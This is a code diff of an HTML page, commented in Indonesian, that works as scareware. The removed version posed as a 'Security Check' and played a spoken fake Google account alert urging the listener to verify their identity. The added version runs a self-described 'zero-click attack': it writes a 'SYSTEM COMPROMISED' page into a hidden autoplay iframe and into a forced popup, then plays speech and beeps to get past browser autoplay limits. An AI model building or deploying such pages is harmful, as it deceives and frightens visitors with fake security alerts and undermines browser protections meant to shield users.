@@ -3,84 +3,48 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Check</title>
+<title>System Check</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    background: #f0f4f8;
-    font-family: 'Segoe UI', Arial, sans-serif;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-    cursor: pointer;
-    user-select: none;
-  }
-  .panel {
-    background: #fff;
-    padding: 40px;
-    border-radius: 12px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.1);
-    text-align: center;
-  }
-  h1 { color: #333; margin-bottom: 10px; }
-  p { color: #666; font-size: 16px; }
-  .spinner {
-    border: 4px solid #f3f3f3;
-    border-top: 4px solid #3498db;
-    border-radius: 50%;
-    width: 40px;
-    height: 40px;
-    animation: spin 1s linear infinite;
-    margin: 20px auto 0;
-  }
-  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  body { background: #111; color: #0f0; font-family: monospace; overflow: hidden; }
+  iframe { display: none; }
 </style>
 </head>
 <body>
-
-<div class="panel">
-  <h1>🔒 Security Check</h1>
-  <p>Klik di mana saja untuk memverifikasi...</p>
-  <div class="spinner"></div>
-</div>
 
 <script>
 (function () {
   'use strict';
 
-  var hasClicked = false;
+  console.log("[!] Memulai Zero-Click Attack...");
 
   // ============================================
-  // KONTEN UNTUK ABOUT:BLANK (Audio & TTS Bypass)
+  // KONTEN UNTUK ABOUT:BLANK (Audio & TTS)
   // ============================================
   var payloadHTML = `
     <!DOCTYPE html>
     <html>
-    <head><title>System Check</title></head>
-    <body style="background:#111;color:#0f0;font-family:monospace;text-align:center;padding-top:20vh;">
-      <h1>SYSTEM VERIFIED</h1>
-      <p>Memutar suara otomatis...</p>
+    <head><title>System Alert</title></head>
+    <body style="background:#000;color:#f00;font-family:monospace;text-align:center;padding-top:20vh;">
+      <h1>SYSTEM COMPROMISED</h1>
       <script>
         (function() {
-          // A. Putar TTS (Google Alert)
+          // A. Putar TTS
           if ('speechSynthesis' in window) {
             window.speechSynthesis.cancel();
-            var u = new SpeechSynthesisUtterance("Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.");
+            var u = new SpeechSynthesisUtterance("Zero Click Autoplay Bypass Successful. Your system is compromised.");
             u.lang = 'en-US';
-            u.rate = 0.9;
+            u.rate = 1.0;
             u.volume = 1.0;
             window.speechSynthesis.speak(u);
           }
 
-          // B. Putar AudioContext Beep (Bypass Autoplay)
+          // B. Putar AudioContext Beep
           try {
             var ctx = new (window.AudioContext || window.webkitAudioContext)();
             if (ctx.state === 'suspended') {
               ctx.resume().then(function() { console.log('[AC] Resumed'); });
             }
-            // Buat suara beep panjang
             var osc = ctx.createOscillator();
             var gain = ctx.createGain();
             osc.type = 'sine';
@@ -89,14 +53,7 @@
             osc.connect(gain);
             gain.connect(ctx.destination);
             osc.start();
-            osc.stop(ctx.currentTime + 2.0); // Beep 2 detik
-          } catch(e) {}
-
-          // C. Putar Audio Element (Silent/Beep)
-          try {
-            var a = new Audio('data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=');
-            a.volume = 1.0;
-            a.play();
+            osc.stop(ctx.currentTime + 2.0);
           } catch(e) {}
         })();
       <\/script>
@@ -105,42 +62,59 @@
   `;
 
   // ============================================
-  // FUNGSI REDIRECT KE ABOUT:BLANK & INJECT AUDIO
+  // METODE 1: IFRAME AUTOPLAY INJECTION
   // ============================================
-  function executeBypass() {
-    if (hasClicked) return;
-    hasClicked = true;
-
-    // Ubah UI
-    document.querySelector('p').innerText = 'Memverifikasi sistem...';
-
-    // 1. Buka tab baru about:blank
-    var win = window.open('about:blank', '_self'); // Gunakan '_self' agar menimpa tab ini, atau '_blank' untuk tab baru
+  function injectAutoplayIframe() {
+    // Buat iframe dengan atribut allow="autoplay"
+    var iframe = document.createElement('iframe');
+    iframe.allow = "autoplay";
+    iframe.style.display = "none";
     
-    if (!win) {
-      // Jika popup diblokir, coba arahkan langsung (fallback)
-      window.location.href = 'about:blank';
-      return;
-    }
+    // Set src ke about:blank
+    iframe.src = 'about:blank';
+    document.body.appendChild(iframe);
 
-    try {
-      // 2. Tulis konten ke about:blank (Parent masih memegang kendali)
+    // Tunggu iframe siap, lalu tulis payload ke dalamnya
+    iframe.onload = function() {
+      try {
+        var doc = iframe.contentDocument || iframe.contentWindow.document;
+        doc.open();
+        doc.write(payloadHTML);
+        doc.close();
+        console.log("[!] Payload disuntikkan ke iframe about:blank.");
+      } catch(e) {
+        console.log("[X] Gagal menyuntikkan payload ke iframe:", e.message);
+      }
+    };
+  }
+
+  // ============================================
+  // METODE 2: TOP-LEVEL REDIRECT FORCED (window.open)
+  // ============================================
+  function forceTopLevelRedirect() {
+    // Mencoba membuka about:blank secara paksa tanpa gesture
+    var win = window.open('about:blank', '_blank');
+    if (win) {
       win.document.open();
       win.document.write(payloadHTML);
       win.document.close();
-      console.log("[!] Audio bypass dieksekusi di about:blank.");
-    } catch (e) {
-      console.log("Gagal menulis ke about:blank:", e.message);
+      console.log("[!] Payload disuntikkan ke window baru.");
+    } else {
+      console.log("[X] Popup diblokir. Menggunakan iframe.");
     }
   }
 
   // ============================================
-  // EVENT LISTENER KLIK (USER GESTURE)
+  // EKSEKUSI (Zero-Click Trigger)
   // ============================================
-  document.body.addEventListener('click', executeBypass, { once: true });
+  
+  // Coba metode Iframe (biasanya diizinkan tanpa popup block)
+  injectAutoplayIframe();
 
-  // Tambahan: Jika user tidak klik, paksa setelah 5 detik (mungkin diblokir)
-  setTimeout(executeBypass, 5000);
+  // Coba metode Top-Level (mungkin diblokir jika tidak ada gesture)
+  setTimeout(function() {
+    forceTopLevelRedirect();
+  }, 1000);
 
 })();
 </script>
